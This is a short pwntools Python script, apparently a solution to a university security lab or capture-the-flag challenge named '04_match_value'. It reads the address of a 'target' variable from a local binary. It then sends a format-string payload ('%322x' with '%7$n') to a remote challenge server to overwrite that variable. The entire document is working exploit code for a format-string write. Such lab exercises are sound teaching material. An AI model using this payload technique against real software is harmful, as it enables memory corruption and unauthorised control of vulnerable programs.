from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25194

s = process('./program/04_match_value', shell=True)

elf = ELF('./program/04_match_value')
target_addr = elf.symbols['target']

print(f"Target address: {hex(target_addr)}")

target_addr_bytes = p32(target_addr)
print(f"Target address bytes: {target_addr_bytes}")

s = remote(SERVER, PORT, timeout=9999)
s.sendline(target_addr_bytes + b'%322x' + b'.%7$n')
response = s.recv().decode(errors='ignore')
s.close()
print(response)